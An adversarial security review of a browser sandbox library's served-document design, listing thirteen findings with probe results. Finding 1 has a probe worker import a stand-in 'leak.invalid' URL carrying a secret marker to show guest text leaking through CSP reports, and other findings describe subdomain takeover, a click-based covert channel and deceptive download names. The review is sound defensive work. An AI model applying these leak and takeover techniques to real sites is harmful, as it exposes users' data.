# Review 1 of the design: an adversarial pass on paper

**Status: a review of [the design](README.md), which is not built.** One reviewer, from reading the design, the code at
`6b2f22f`, the API reports, the archived board passes and research 27 to 30, plus three probes run on Chromium 159,
Firefox 159 and WebKit 27.2 (Playwright 1.65.1, loopback only). Each finding says whether it comes from reading or from a
run. The probes and their output are in [review-1/](review-1/p1-output.txt) (`p1-outside-report-only.mjs`, `p2-p3.mjs`);
their outputs are quoted where they are used. The design's files have since been revised: [the index](README.md#what-review-1-changed)
lists the answer to each finding, and the quotations below are of the design as it stood.

## Verdict in brief

- The core construction holds: in the static file, guest content runs opaque however the file is opened (I11), and I did
  not find a way around it.
- The served document does not give the view "a policy of its own". The response headers of the origin that serves the
  file are a policy too. Under a site-wide report-only header, the view and the worker report to the site's endpoint
  again (run). Step 4 would then delete the mitigations that keep guest text out of those reports.
- Three claims are stronger than the design can make good: the start-up gates were measured in the scripted file the
  design rejects; the frame layout as drawn removes `allow-forms` from the view (run); and I5 is false for capture
  listeners (run).
- The rest are gaps an implementer would have to fill by guessing: commits of stale writes, the quota versus the moved
  module rewrite, the two builds' bootstraps, re-entrancy in `start()`, and the downloaded file's name.

## Findings

### 1. A header on the served file is an inherited policy: the report channel comes back, and step 4 deletes its mitigations

- **Breaks:** I12 ("the served file's policy has no input"), the third row of the design's own table ("the view lives
  in a served file with a policy of its own"), and the premise of step 4 in [05](05-build-order.md). I15 does not see
  it.
- **Attacker model:** the guest, on a mistaken embedder's ordinary deployment (also 4, the browser applies a header the
  design does not account for).
- **Scenario:**
  1. The embedder's origin sends `Content-Security-Policy-Report-Only: default-src 'self'; report-uri …` on every
     response. This is the usual way to roll a CSP out, and it is usually set server-wide (an `add_header` at the
     server level, a CDN rule, a middleware that runs before the static handler). The embedder serves
     `sealed-document.html` "unchanged", as 03 asks, and the header goes with it.
  2. A report-only policy refuses nothing, so F, C and the worker run normally and the start-up gates pass (research 28
     Q7 measured this: "the gates still passed").
  3. Each action of C and the worker that the header's list would refuse is POSTed to the site's endpoint. That endpoint
     is often a third-party processor (the setting of `BD6:ISO-2`).
- **Evidence (run, p1).** The design's static file (the guard, C in F's markup with the hash-admitted bootstrap, C
  starting a `blob:` worker) was served with the header above. C loaded one `blob:` image and set one `data:` CSS URL.
  The worker called `import('https://leak.invalid/GUEST-SECRET-IMPORT')` and `eval('/* GUEST-SECRET-EVAL */ 1')`:
  ```
  chromium | report-only default-src self | reports=7 | carrying guest text=1
      img-src doc=about blocked=blob · img-src doc=about blocked=data
      script-src-elem doc=blob blocked=https://leak.invalid/GUEST-SECRET-IMPORT
  chromium | … 'report-sample' | reports=7 | carrying guest text=2
      script-src doc=blob blocked=eval sample=/* GUEST-SECRET-EVAL */ 1
  firefox  | the same two cases: 7 reports, 1 and 2 carrying guest text (C's and the worker's)
  webkit   | 1 report, from F only
  ```
  With no header, every engine sent 0 reports. Research 27 had already found this:
  [Q3](../research/27_served_document_headerless/README.md#q3-a-policy-added-from-outside) says "the `cspReporting` row
  of `INHERITED_CONTEXT` returns through the server instead of through the host page". The design cites research 27
  but never mentions Q3. Research 28's Q5 row for `entryScan` ("whose `report-uri` the engines ignore, so the reason
  disappears") holds only when no header applies. The same holds for its Q6 line that says the policy rows "close by
  construction".
- **Effect:** data. Sealed mode at its default configuration sends POSTs to a server, on Chromium and Firefox.
  - Today's mitigations stay in step 3: the entry scan (`src/host.ts:1804`, `_buildRefusal`), the code-from-string
    refusal (`BD6:ISO-1`), `keepsUrl` (`BD7:ISO-1`) and the CSSOM styles. With them, what is left is the `blobLoads`
    residual of `cspReporting` (`src/lib/inherited-context.ts:153-156`): the guest picks how many reports, of which
    directive, and when. That is `BD7:ISO-1`'s shape, medium. Today's documented remedy, "admit `blob:` in the page's
    policy", has no counterpart: the embedder is told the file needs no server config, so they do not know a header
    applies.
  - Step 4 deletes "the code that steps around the inherited policy … row by row". If it deletes the entry scan, the
    code-from-string refusal or the CSS URL cut, guest-chosen text reaches the endpoint, as above. That is
    `BD6:ISO-2`'s shape, high.
  - An enforced site header that admits `'unsafe-inline'` (research 27 Q3, second row) both refuses and reports. It
    also refuses the `blob:` worker, so the build fails, after the reports have left.
- **Rung:** the design claims impossible to build (I12; "a policy of its own"). It is a documented limit that is not
  documented, and with step 4 it regresses to an open channel.
- **Direction:**
  - Add a row to `INHERITED_CONTEXT` for "the policy the file's response carries". Keep every `cspReporting` and
    `cspPolicyText` mitigation through step 4, and keep their tests. Today those tests run against the host page's
    policy, which no longer reaches the view, so in the new topology they would pass whatever the code did. Point them
    at the file's headers.
  - Add a start-up gate that ends the build on any `securitypolicyviolation` whose `originalPolicy` is not the file's
    own `<meta>`. In p1 the library's own inline scripts were reported, so a gate would see a script-restricting
    policy at once; research 27 Q3 lists what it cannot see. Run the gate before any guest content exists, and accept
    that its own reports carry only library strings.
  - Document `Content-Security-Policy` and `-Report-Only` on the file, `X-Frame-Options: DENY` and a non-HTML type
    (research 27 Q5) as what "no server config" excludes.

### 2. Whoever answers `documentUrl` receives the app and holds its ports

- **Breaks:** the rung of I3, I11 and I13 as stated. They hold for the package's bytes. The browser renders the server's
  bytes.
- **Attacker model:** 4 and 3. Whoever controls the host that answers `documentUrl`, a host the design invites
  embedders to add ("Optional: the file on a second hostname").
- **Scenario:**
  1. The embedder follows 03's option and serves the file from `files.example.com`, a static bucket behind a CNAME.
     Later the bucket is deleted and the name is claimed by someone else, a classic subdomain takeover. A CDN that
     serves the package's copy, or a poisoned cache entry for that URL, gives the same position.
  2. The element frames `documentUrl`. At F's load, today's flow posts `INIT_VIEW` to `frames[0]` of whatever document
     loaded, with `'*'` as the target. That message carries the whole worker source, so every registered file and the
     committed writes, plus both `MessagePort`s (`src/host.ts:1440-1455`, `_setupStrictChannels`; `:498`,
     `guestWindowOf`).
  3. The document at that URL puts its own frame at `frames[0]`. That frame receives the app's files and the user's data
     in them. It holds the logic port, so it can call every host method in `app.methods` as the guest, and it receives
     every `call()` the embedder makes, with its arguments.
- **Evidence (reading).** Today the host writes the wrapper itself (`setLibrarySrcdoc`, `src/host.ts:1949`), so
  `frames[0]` is a document the library built. In the design it is whatever the server sends. A cross-origin document's
  code cannot be authenticated, and frames have no subresource integrity. The 03 text for the second hostname weighs only
  the wrong-way opening ("never the embedder's app's", impossible to reach). It does not weigh this.
- **Effect:** data leaks and can be manipulated. The precondition is a compromised or misconfigured file host, and a
  second hostname adds one more host that can be compromised. Medium.
- **Rung:** the design claims impossible to build. I find it a property of the deployment, which is a documented limit
  that is not stated.
- **Direction:**
  - Make the default `documentUrl` the bundle's own asset, `new URL('./sealed-document.html', import.meta.url)`, which
    common bundlers copy and serve beside the code. The file's host is then the library's code host, and adds no trust
    root.
  - Say in the docs that a separate `documentUrl` is trusted with the app's data and the host methods.
  - Let C prove nothing it cannot, but have it announce its version and build before the host posts anything (finding
    3). That catches honest mismatches, never a hostile server.

### 3. The start-up gates as measured ran in a file the design does not build

- **Breaks:** I15's rung, the 03 claim "Measured: each of the twelve canaries tripped under the mutant that provokes it",
  and I13's planned source scan ("one script, the guard, with no listener").
- **Attacker model:** 4.
- **Scenario:**
  - Research 28 Q7 ran the gates in the scripted topology. F's script awaited its own canaries and created C only if all
    held. C ran its canaries before starting the worker. F posted `passed` or `refused` to the host
    (`docs/research/28_served_topology/q7-gates.mjs:91-105`).
  - The design adopts the static file instead: C is an element of F's markup and F's only script is the synchronous
    guard (`topology.mjs:147-154`).
  - F's realm canaries are asynchronous (`connect`, `image`, `style`). The parser builds C while they are still pending.
    So "no `<meta>` stopped F before C existed" cannot hold for the static file unless F gets more script than the
    guard.
  - Today the host sends the guest's content at the wrapper's load (`INIT_VIEW`, `_setupStrictChannels`), before any
    check-in. If that order is kept, guest content exists before any gate has answered. 03 says "Nothing of the guest's
    has run by then", which needs a new order that the design does not specify: a portless announcement from C with
    the gates' verdict and the file's version, then the `INIT_VIEW`.
- **Evidence:** reading, from the two probe sources cited.
- **Effect:** correctness of a claimed check. Content would reach a C whose gates have not run, or an old version's C.
  The mutants are browser faults, not attacks, so no data path follows directly.
- **Rung:** a check, as claimed, but measured for another topology. "Measured" is overstated.
- **Direction:** gates in C and the worker only. F keeps the guard alone, so I13's scan holds. The host posts nothing
  but a port until C's verdict arrives on it, and the guest's content follows on that port. Re-measure Q7 in that form.

### 4. The view inherits F's sandbox flags: as drawn, the view loses `allow-forms` and `submit` stops

- **Breaks:** unspecified (the diagram in [03](03-served-document.md#the-shape) gives F `sandbox="allow-scripts"`). It
  also limits what research 28's twelve ways and research 29's served case measured.
- **Attacker model:** 3 and 4 (an implementer follows the diagram).
- **Scenario:** sandboxing flags of a nested frame are the union of its own and its parent's. With F framed
  `allow-scripts`, C's own `allow-forms` does nothing. `src/host.ts:419` already records that without `allow-forms`
  Chromium and Firefox dispatch no `submit`, which the view needs to forward.
- **Evidence (run, p2-p3).** F was framed by the host, with C in F's markup as `sandbox="allow-scripts allow-forms"`. A
  submit button click plus `requestSubmit()` gave these counts of `submit` events in C:
  ```
  chromium | F sandbox="allow-scripts" | 0 · F sandbox="allow-scripts allow-forms" | 2
  firefox  | 0 · 2
  webkit   | 2 · 2
  ```
  Research 28's Q6 spike worked because the library's own flags were kept on the iframe it served.
- **Effect:** correctness. Every guest form breaks on Chromium and Firefox. The same inheritance decides what
  `capabilities: ['allow-orientation-lock']` can do: today the flag goes on the view (`src/host.ts:1823-1825`), but a
  static file's C has one fixed attribute.
- **Rung:** unspecified.
- **Direction:** by construction, C's static attribute carries the most the library ever grants
  (`allow-scripts allow-forms allow-orientation-lock`), and the host narrows per app with F's attribute, since the
  intersection is what applies. Re-run the twelve ways and research 29's served case with F carrying `allow-forms`.

### 5. I5 is false: a non-bubbling event reaches every capture listener on the element's ancestors

- **Breaks:** I5 ("reaches only listeners on its own element", impossible to build).
- **Attacker model:** 3 (an embedder's page-wide capture listener). The guest only supplies the data.
- **Scenario:** `document.addEventListener('sandbox-log', fn, true)` on a page with two apps receives both apps'
  events. Capture runs on the whole path whatever `bubbles` says.
- **Evidence (run, p2-p3).** A `CustomEvent('sandbox-log', { bubbles: false })` dispatched on an element reached
  `window-capture, document-capture, ancestor-capture` on all three engines. The bubbling listener on `document` did not
  fire. `elementEvent` sets only `bubbles` (`src/lib/element-events.ts:75`), and `ELEMENT_EVENTS`' "Does not bubble."
  test cannot enumerate capture listeners.
- **Effect:** the docs would mislead. Mixing apps through a capture listener is about as deliberate as through a
  bubbling one on `document`, so the data effect is low.
- **Rung:** the design claims impossible to build. It is a convention.
- **Direction:** state it as what it is: an event is seen by listeners on the element, and by capture listeners on its
  ancestors. The construction would be to dispatch the guest's events on an `EventTarget` that is in no tree, one per
  app, which costs a handle the design chose against.

### 6. `links` sits in `app.config`, beside the app's own content

- **Breaks:** I6's premise ("the embedder lists the URLs"), which nothing enforces.
- **Attacker model:** 3, a config built from data, and the guest.
- **Scenario:**
  1. An embedder that runs third-party apps stores each app as one value, `{ config, files }`. This is what `start(app)`
     invites, since `config.html` and `config.entry` are the app's own content and come with its bundle.
  2. The app's author ships `config.links` with 32 URLs on their own server.
  3. The guest covers its box with a transparent marked link. 02 accepts that it can, and the link it puts under each
     user click is chosen from 32, which carries about 5 bits of whatever the guest knows per click, plus the time, to
     the author's server.
  4. The tab opens on the user's click on the embedder's page, so it carries that page's credibility.
- **Evidence:** reading. 03 applies the right rule to `documentUrl` ("data that describes an app can never choose the
  document that renders it"), but 01 and 02 do not apply it to the grants (`links`, `guestWrites`, `capabilities`).
- **Effect:** data, low bandwidth, and the docs would mislead. The same signal exists when an honest embedder lists
  the author's site, which 02 accepts. What changes is that the embedder never meant to grant it.
- **Rung:** "the embedder lists" is a convention.
- **Direction:** split `SandboxApp` into the app (`html`, `entry`, `files`) and the embedder's grants (`links`,
  `guestWrites`, `capabilities`, `methods`). Both still go to one `start()` call, but an app bundle read from data
  cannot carry a grant without a line of the embedder's that moves it.

### 7. "One text per library version" is false: the bootstrap differs between the two builds

- **Breaks:** I12 ("a function of the library version alone") and the "another version's" termination reason as named.
- **Attacker model:** 3 (an embedder serves one build's file to the other build).
- **Evidence (reading).** `viewBootstrapSource` (`src/lib/in-sandbox-view.ts:4539-4545`) adds the fetch bridge's role
  branch whenever the network modes are installed. So C's script, its hash, and F's `<meta>` differ between the default
  build and the network build of the same version. Research 28 Q2 lists the bootstrap's hash as "constant per build".
- **Effect:** correctness. The file the package exports matches only the build it came from, and a version check that
  ignores the build passes a file whose hash then refuses C's script.
- **Direction:** make sealed mode's C bootstrap build-independent (the bridge frame keeps its own document), or name the
  file and its check by version and build.

### 8. `start()` cannot throw the quota error once the module rewrite has moved into the view

- **Breaks:** a contradiction between [01](01-one-element-one-app.md) (the files "are checked as one batch by the file
  store's rules (paths, types, the quota)", synchronously, `FileError`) and [03](03-served-document.md#a-thinner-host)
  (the module rewrite and the stylesheet scans move into C).
- **Evidence (reading).** The quota counts what each module rewrite and each stylesheet's references add, and finds it
  by lexing in the host (`src/lib/files.ts:457-472`, `rewriteModule`, `rewriteCost`).
- **Effect:** correctness. The implementer has two choices. One is to keep a lexer over guest JavaScript in the host
  realm, so the pass does not leave. The other is to change the quota so that an app that fits at `start()` fails at
  build, which breaks I2's companion rule that an unusable app throws.
- **Direction:** decide which. A quota over registered bytes only, with C refusing past a bound the host also states,
  keeps both properties.

### 9. Step 4 would delete code the constant policy itself needs

- **Breaks:** the step 4 list in [05](05-build-order.md#step-4--delete-what-the-served-document-made-unreachable).
- **Evidence (reading).** Step 4 names "the styles applied through the CSSOM to pass a host `style-src`". F's constant
  policy has `style-src <still sheet> blob:` and no `'unsafe-inline'` (03; research 28 Q2), so the CSSOM path is what
  lets any guest style apply at all. The same goes for the view's Trusted Types probe (`trustedTypesReady`,
  `in-sandbox-view.ts:3654`) under a `require-trusted-types-for` header on the file, which research 27 Q3 found binds
  C and the worker.
- **Effect:** correctness. The tempting repair, `'unsafe-inline'` in F's `style-src`, would put guest CSS text into
  reports under finding 1's headers.
- **Direction:** step 4 deletes only host-realm code (`setLibrarySrcdoc`, the policy generator) and keeps everything the
  view does about its own policy.

### 10. A `GuestWrite` stays committable after its entry was committed or discarded

- **Breaks:** unspecified around I4. Its letter holds.
- **Attacker model:** 3, a handler that awaits.
- **Scenario:**
  1. The guest writes `notes.json` = A. An autosave lists `wA` and awaits a server-side check.
  2. The guest writes B. The user saves, so `wB` is committed.
  3. The check finishes and the autosave commits `wA`.
  4. 01's rule skips only "a value whose path has a newer pending write". Nothing is pending at that path, so A
     overwrites B.
  The same happens after a `reset()` or a re-insertion, where today's overlay is discarded (`src/lib/guest-writes.ts:45`,
  "the host discards it at the next build").
- **Effect:** correctness (lost update, with bytes the embedder did see).
- **Direction:** commit only a value whose entry *is* the path's current pending entry, compared by identity. Anything
  else is skipped, including entries already committed and those of an ended environment.

### 11. `start()` is re-entrant through the embedder's own code

- **Breaks:** the rung of I1 and I3 as stated.
- **Scenario:** validation reads the app: the config's structured copy and the methods' own keys run getters and Proxy
  traps. `start({ config, files, get methods() { el.start(otherApp); return { save }; } })`:
  1. The inner call finds no app, binds `otherApp` and builds at once.
  2. If the outer call checked "already bound" only at its entry, it then stores its own values over the inner app's.
  3. The running environment is `otherApp`'s, and the methods are the outer app's.
- **Effect:** correctness, contrived. But "impossible to build" needs the binding claimed before the first read of the
  app.
- **Direction:** mark the element as binding before reading anything, and release the mark if validation throws.

### 12. No member says whether an element is bound, and framework set-up hits the throw

- **Breaks:** unspecified. It is a cost the design does not name.
- **Scenario:** under React's development StrictMode, `useEffect(() => { el.start(app); return () => el.terminate(); })`
  runs mount, cleanup, mount on one element. The second `start()` throws, and the element stays terminated. A page that
  reuses the element for another app without a `key` gets the same throw. The natural "fix", a `try`/`catch` that
  ignores it, leaves app A running under app B's UI. `state` reads `'idle'` both for a fresh element and for a bound one
  outside the document, so the embedder cannot write the guard either.
- **Effect:** correctness and DX. The throw is the right answer; the missing reading of it is the gap.
- **Direction:** a read-only `app` or `started` member, and a docs note that frameworks need one element per app (a
  `key`).

### 13. `download()` leaves the file name to the embedder, who will use the guest's path

- **Breaks:** unspecified next to I9. It is the same step that 02's root names: the host page gives guest data its
  authority.
- **Scenario:** `a.href = URL.createObjectURL(w.content.download()); a.download = w.path.split('/').pop(); a.click()`
  with `w.path === 'invoice.pdf.exe'` or `report.html`. The file is saved under the embedder's origin, which the
  browser's download UI shows. An `.html` opened from disk runs as a local document.
- **Effect:** manipulation of the user under the host page's authority, not a data leak. Low to medium.
- **Direction:** `download()` returns a `File` named by the library, with an inert extension unless the type is on
  `INERT_TYPES`, or takes the name and sanitises it.

## Invariant by invariant

| # | Result | What I tried |
| :--- | :--- | :--- |
| I1 | rung overstated, see 11 (and 12) | getters and Proxies during validation; StrictMode double set-up; a second `start()` from a `terminated` listener (throws, held) |
| I2 | held, with finding 8 | throws from each part; a quota whose cost is known only after the rewrite has moved |
| I3 | rung overstated, see 2 and 11 | the methods' reach through a document other than the library's at `documentUrl`; re-entrancy |
| I4 | held to its letter, see 10 | a write between list and commit (skipped, held); a stale value after a commit or a rebuild; copies and framework proxies (a copy is refused: fails closed) |
| I5 | broken by 5 | capture listeners on the ancestors (run) |
| I6 | held for an intact view; see 6 | a covering link and focus moved under Enter (only the accepted dressing-up); a compromised view, which can send any index and so opens any *listed* URL within 5 s of any click (research 30's window), the shape 02 rejected for the call, bounded by the list |
| I7 | held | arguments, results, log lines, guest writes, the view's frames, `Error` values. A refused `Blob` is still deserialised in the host realm before the measure refuses it; "exists" should read "reaches the embedder" |
| I8 | held | no extension, an unknown or upper-case extension: each is `application/octet-stream` or not inert, so it needs `code` |
| I9 | held as a check; see 13 | polyglots behind an image signature (rendered as an image); an image-typed `blob:` as a script or worker (refused by strict MIME checks, from reading) |
| I10 | held as a check | nothing to attack on paper; a new member without a row fails the planned test |
| I11 | held; see 2 for the deployment | the guard blocked by a header or rewritten by a CDN (C is built, but answers only `parent.parent`, so it is no worse than hostile sandboxed framing); a compromised C navigating itself (F's `frame-src 'none'` checks it, as today's wrapper's does) |
| I12 | broken by 1 and 7 | a header on the file; the two builds |
| I13 | held for the package's file; see 2 and 3 | F's realm gates would need script in F |
| I14 | held as a check | the guard not running: C exists but takes its init only from `parent.parent` |
| I15 | rung overstated, see 3 and 1 | the measured gates' topology; an outside report-only policy passes every gate |
| I16 | held (not re-run) | its served-document measurement framed F without `allow-forms` (finding 4) |

## What the design does not specify

- Whether `start()` throws for cross-field errors it can see (an `entry` that names no given file, or not a JavaScript
  one), or builds and terminates as today.
- `start()` on an element that is `'terminated'` but has no app, and `terminate()` on one with no app.
- What happens to pending guest writes at `reset()` and at re-insertion, and whether a value minted before them is still
  live (finding 10).
- The order at start-up: what C announces before the guest's content, which message carries the version and the build,
  and what the host does with a C that never announces (findings 3 and 7).
- How the host tells apart "the file is missing", `X-Frame-Options` or `frame-ancestors` refusing it, and a 200 with
  another document (an SPA fallback). In each, the iframe fires `load`, and only a timeout follows.
- How caching is meant to work across library upgrades: a long-lived cache of an old file ends in "another version's"
  on every page until it expires. Whether `documentUrl` may carry a query for cache busting.
- `defineWebSandbox({ documentUrl })` called twice with different URLs (today a second call with the same name "does
  nothing").
- Which elements count as links (`a`, SVG `a`, a MathML element with `href`, `area`), whether a click on a descendant
  counts, and what `auxclick` does.
- Where the per-app view flags go (`capabilities`) once C's attribute is a constant (finding 4).
- What the realistic host and the directive matrix test once the host page's policy no longer reaches the view, and
  the file's headers do (finding 1).

## Claims checked against the research and the code

**Matched:**
- Research 28's figures: the twelve ways (eleven on WebKit), the guarded file creating C only when framed sandboxed,
  3 to 5 ms of start-up, the constant policy on all three engines, the timer stalls of Q4b.
- Research 29's table in 04.
- The view's single `INIT_VIEW` from `parent.parent` (`in-sandbox-view.ts:3635`).
- Research 27 Q5: the host's Service Worker never saw the sandboxed frame's navigation, so a cache-first worker does not
  serve the file.
- Research 30's 5-second window, one tab per click, and the blocked-invisible `null`.

**Did not match, or overstated:**
- The gates' "measured" (finding 3).
- "Policy rows close by construction" (finding 1, against research 27 Q3).
- "One text per version" (finding 7).
- 02's "through the real library in sealed mode": research 30's library variant measured the rejected *call* shape in
  today's `srcdoc` topology, not the click-is-the-request shape in a served file. The design's shape is likely to
  behave the same, but it is not measured.
- 01 names `BD5:CHL-1` among the findings one element per app closes. The board's verdict says "one element per app"
  alone does not fix it, since the store key is page-wide, and 01's own "what stays the embedder's" agrees.
- `BD5:DOC-3`'s second path (a terminated app's started handler re-creating deleted data) stays open, as 01 says. The
  README's table does not.
- "`setConfig` appears in 73 test files at about 660 call sites": at `6b2f22f`, `grep` finds it in 84 files of `test/`,
  404 times.

## Open questions

- Does Chromium's address and card autofill behave the same when F carries `allow-forms`? Settled by re-running
  research 29's served case (c, cshadow) with the flag.
- Can a gate detect an outside report-only policy before C's first report? How many reports does the detection itself
  send, and does WebKit raise the events in the worker? Settled by research 27 Q3's detector placed in C, before the
  `INIT_VIEW`.
- Does Safari propagate a click's activation in C across the port hop to the host's `window.open`? Settled on a Mac,
  with research 30's pages.
- Can a page that frames the embedder's host page reach F's window (a frame in a closed shadow root and
  `window.frames`) and navigate it before its first load? Settled by a probe per engine. Today's `srcdoc` wrapper has
  the same question, so the answer bounds both.
- Does production Safari close as Playwright's WebKit did in the sandboxed-popup case? The guarded file avoids the
  trigger, but an unguarded file shipped by mistake would not.
